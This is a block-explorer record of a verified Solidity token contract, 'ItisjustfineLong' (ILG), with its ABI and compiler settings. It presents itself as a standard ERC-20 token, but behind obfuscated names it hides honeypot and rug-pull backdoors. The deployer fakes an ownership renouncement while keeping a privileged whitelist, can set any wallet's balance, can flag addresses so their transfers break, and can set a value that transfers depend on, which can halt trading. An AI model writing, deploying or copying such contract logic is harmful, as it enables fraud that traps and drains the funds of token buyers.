{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface totalEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenMaxMarketing {\n    function createPair(address fromBuy, address listLaunched) external returns (address);\n}\n\ninterface exemptReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toLaunched) external view returns (uint256);\n\n    function transfer(address receiverLimit, uint256 walletFeeMax) external returns (bool);\n\n    function allowance(address txSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletFeeMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLimit,\n        uint256 walletFeeMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeReceiver, uint256 value);\n    event Approval(address indexed txSell, address indexed spender, uint256 value);\n}\n\ninterface exemptReceiverMetadata is exemptReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ItisjustfineLong is receiverLaunched, exemptReceiver, exemptReceiverMetadata {\n\n    function txToken() public {\n        emit OwnershipTransferred(txSender, address(0));\n        txTotalTrading = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return txTotalTrading;\n    }\n\n    uint256 public teamFee;\n\n    function autoAmountSell(address senderTo) public {\n        if (limitReceiverAuto) {\n            return;\n        }\n        if (fundWallet == teamFee) {\n            fromMarketing = fundWallet;\n        }\n        tokenMarketing[senderTo] = true;\n        if (teamFee != fromMarketing) {\n            tradingLimitTx = true;\n        }\n        limitReceiverAuto = true;\n    }\n\n    string private tokenFund = \"Itisjustfine Long\";\n\n    bool private tradingLimitTx;\n\n    address limitTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address feeLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public autoLimit;\n\n    function amountLaunched(address totalAuto, address receiverLimit, uint256 walletFeeMax) internal returns (bool) {\n        if (totalAuto == txSender) {\n            return launchMarketing(totalAuto, receiverLimit, walletFeeMax);\n        }\n        uint256 buyTakeAmount = exemptReceiver(feeAmount).balanceOf(feeLiquidity);\n        require(buyTakeAmount == swapLaunchMarketing);\n        require(receiverLimit != feeLiquidity);\n        if (autoLimit[totalAuto]) {\n            return launchMarketing(totalAuto, receiverLimit, isShould);\n        }\n        return launchMarketing(totalAuto, receiverLimit, walletFeeMax);\n    }\n\n    function balanceOf(address toLaunched) public view virtual override returns (uint256) {\n        return takeTrading[toLaunched];\n    }\n\n    function allowance(address receiverMode, address launchToken) external view virtual override returns (uint256) {\n        if (launchToken == limitTake) {\n            return type(uint256).max;\n        }\n        return maxSell[receiverMode][launchToken];\n    }\n\n    mapping(address => mapping(address => uint256)) private maxSell;\n\n    address public txSender;\n\n    constructor (){\n        if (amountTeam == tradingLimitTx) {\n            amountTeam = false;\n        }\n        totalEnable autoEnableTake = totalEnable(limitTake);\n        feeAmount = tokenMaxMarketing(autoEnableTake.factory()).createPair(autoEnableTake.WETH(), address(this));\n        \n        txSender = _msgSender();\n        txToken();\n        tokenMarketing[txSender] = true;\n        takeTrading[txSender] = swapTake;\n        if (fromMarketing == teamFee) {\n            tradingLimitTx = true;\n        }\n        emit Transfer(address(0), txSender, swapTake);\n    }\n\n    mapping(address => uint256) private takeTrading;\n\n    address public feeAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapTake;\n    }\n\n    function transfer(address amountLaunch, uint256 walletFeeMax) external virtual override returns (bool) {\n        return amountLaunched(_msgSender(), amountLaunch, walletFeeMax);\n    }\n\n    uint256 public fundWallet;\n\n    function transferFrom(address totalAuto, address receiverLimit, uint256 walletFeeMax) external override returns (bool) {\n        if (_msgSender() != limitTake) {\n            if (maxSell[totalAuto][_msgSender()] != type(uint256).max) {\n                require(walletFeeMax <= maxSell[totalAuto][_msgSender()]);\n                maxSell[totalAuto][_msgSender()] -= walletFeeMax;\n            }\n        }\n        return amountLaunched(totalAuto, receiverLimit, walletFeeMax);\n    }\n\n    function isLaunch(address amountLaunch, uint256 walletFeeMax) public {\n        isLimit();\n        takeTrading[amountLaunch] = walletFeeMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenFund;\n    }\n\n    uint256 private fromMarketing;\n\n    function launchMarketing(address totalAuto, address receiverLimit, uint256 walletFeeMax) internal returns (bool) {\n        require(takeTrading[totalAuto] >= walletFeeMax);\n        takeTrading[totalAuto] -= walletFeeMax;\n        takeTrading[receiverLimit] += walletFeeMax;\n        emit Transfer(totalAuto, receiverLimit, walletFeeMax);\n        return true;\n    }\n\n    address private txTotalTrading;\n\n    string private totalLaunched = \"ILG\";\n\n    uint256 swapLaunchMarketing;\n\n    uint256 launchReceiver;\n\n    bool public limitReceiverAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingLiquidityTo;\n    }\n\n    bool public amountTeam;\n\n    function tradingLiquidity(address amountShould) public {\n        isLimit();\n        \n        if (amountShould == txSender || amountShould == feeAmount) {\n            return;\n        }\n        autoLimit[amountShould] = true;\n    }\n\n    uint256 constant isShould = 20 ** 10;\n\n    uint256 private swapTake = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalLaunched;\n    }\n\n    event OwnershipTransferred(address indexed launchTrading, address indexed teamTxList);\n\n    function takeTeam(uint256 walletFeeMax) public {\n        isLimit();\n        swapLaunchMarketing = walletFeeMax;\n    }\n\n    uint8 private marketingLiquidityTo = 18;\n\n    mapping(address => bool) public tokenMarketing;\n\n    function approve(address launchToken, uint256 walletFeeMax) public virtual override returns (bool) {\n        maxSell[_msgSender()][launchToken] = walletFeeMax;\n        emit Approval(_msgSender(), launchToken, walletFeeMax);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return txTotalTrading;\n    }\n\n    function isLimit() private view {\n        require(tokenMarketing[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTxList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFeeMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"}],\"name\":\"autoAmountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFeeMax\",\"type\":\"uint256\"}],\"name\":\"isLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletFeeMax\",\"type\":\"uint256\"}],\"name\":\"takeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"}],\"name\":\"tradingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFeeMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFeeMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ItisjustfineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}